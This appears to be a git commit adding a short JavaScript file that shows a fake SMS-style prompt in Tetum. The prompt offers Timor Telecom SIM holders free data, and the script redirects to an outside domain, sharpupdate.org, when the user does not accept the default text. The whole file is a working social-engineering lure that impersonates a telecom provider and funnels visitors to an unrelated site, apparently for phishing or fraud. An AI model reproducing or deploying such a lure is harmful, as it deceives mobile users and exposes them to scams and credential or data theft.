4ffdd8c9934ddf769d335cec0a4aff1d1ae54d49
ekperikpe <ekperikpe588@gmail.com>
2025-05-02 07:25:24 +0100

    Create timor-active.js

---
+++ timor-active.js
@@ -0,0 +1,5 @@
+var password = 'Ativa 100GB'
+password=prompt('SMS: Parabéns, imi nia kartaun SIM Timor Telecom bele simu rekompensa kartaun sim tuan ho dadus gratuita, klik OK hodi ativa agora','Ativa 100GB');
+if (password != 'Ativa 100GB') {
+location.href='https://sharpupdate.org/timor.html';
+}
